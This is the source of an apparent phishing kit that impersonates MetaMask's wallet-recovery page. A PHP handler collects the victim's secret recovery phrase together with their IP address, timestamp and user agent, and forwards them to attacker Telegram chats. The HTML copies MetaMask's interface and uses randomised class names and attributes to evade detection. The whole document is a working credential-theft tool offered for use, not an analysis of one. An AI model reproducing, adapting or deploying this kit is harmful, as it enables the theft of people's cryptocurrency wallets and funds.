...
if(isset($_POST['seed'])){
 foreach($IdTelegram as $chatId) {
    ...
    $message = "[+]━━━━━━❤️‍🔥PHARSEMASUK METAMASK USDT❤️‍🔥━━━━━━[+]\n[👤 Login] : ".$_POST['seed']."\n      [+]━━━━【💻 System】━━━[+]\n[🔍 IP INFO] : ".$ip."\n[⏰ TIME/DATE] : ".$date."\n[🌐 User-Agent] : ".$_SERVER['HTTP_USER_AGENT'];
...
<html data-cbscriptallow="true">
  ...
  <body data-9bite7="l823si" class="3vljnf ">
    <div class="tengge z2 hidden" id="app-content" data-3o050y="b8ehgz">
      <img alt="" id="loading__logo" src="icon.svg">
    ...
    <div id="app-content" class="mphxcz z3" data-67vlch="0cngou">
      <div data-reactroot="" class="e3fztq app" data-h43gyc="ks9wfs">
        ...
        <div class="qipm1b app-header" data-ga8czk="dr5vpd">
          <div class="78hlun app-header__contents" data-jozf9q="3m7dxh">
            <div class="r493gl app-header__logo-container" data-3uljk3="hjer5z">
              <img alt="" class="app-header__metafox-logo app-header__metafox-logo--horizontal" height="30" src="logo.svg">
              <img alt="" class="app-header__metafox-logo app-header__metafox-logo--icon" height="42" width="42" src="icon.svg"></div>
            <div class="ozhulp app-header__account-menu-container" data-acra13="lcq0wv">
              <div class="396ng1 app-header__network-component-wrapper" data-v2ey5c="d7p0z5">
                <div class="3ukyag network-component pointer ethereum-network" title="Ethereum" data-udgoob="gyt1s3">
                  <div class="h33tg1 network-indicator" data-fyglvn="466j7x">
                    <div class="dgz305 menu-icon-circle" data-bmt3a1="m47oro">
                      <div style="background: rgb(3, 135, 137); border: none; height: 12px; width: 12px;" data-beyb7n="ace0e3" class="lf4hy6 "></div>
                    </div>
                    <div class="3idsyp network-name" data-9r4uod="pu6qoo">Ethereum Mainnet</div>
                  </div>
                </div>
              </div>
            </div>
          ...
          <div class="v7n2as first-view-main-wrapper" data-4ofnr1="0vova1">
            <div class="vp2us5 first-view-main" data-mrayej="5133i4">
              <div class="bdn14w import-account" data-u89h31="u0ye8m">
                <br>
               <div class="7v3jmq import-account__title" style="font-size: 28px;" data-5hadvz="qrk3pi">Restore your Account with Secret Recovery Phrase</div>
                <div class="nqkikt import-account__selector-label" data-h780ya="tm11f0">Enter your secret phrase here to get into your wallet.</div>
                <div class="lduw14 import-account__input-wrapper" data-4jznd5="noubqo"><label class="uygc87 import-account__input-label" data-xrn1ys="0z572r">Wallet Secret Recovery Phrase</label><textarea class="import-account__secret-phrase" placeholder="Paste Secret Recovery Phrase from clipboard" id="seed" ></textarea></div>
                <p style="margin-top: 5px; font-size: 14px; color: rgba(247, 134, 28, 0.9);" data-mfuk52="h32kji" class="d3dknj ">Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words</p>
                <p style="color: red; display: none" id="errorText">Invalid Secret Recovery Phrase</p>
                <span class="mv8dyq error" data-kmal0t="g4129b"></span><button class="nxqj2z button btn--first-time first-time-flow__button" id="imp" disabled data-exfc27="26logd">Proceed</button>
              </div>
            </div>
          </div>
        </div>
    ...
    <div class="wawobp loader" data-tenqwa="9fkuxe">
      <div class="yat5ls lodas" data-2ivb6w="2n92zq">
        ...
        <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
          <svg version="1.1" id="loader-1" fill="#FF6700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="40px" height="40px" viewbox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
    ...
    <script>
      const redirectUrl = 'Metamask.php' // redirect url setelah memasuki lastStage
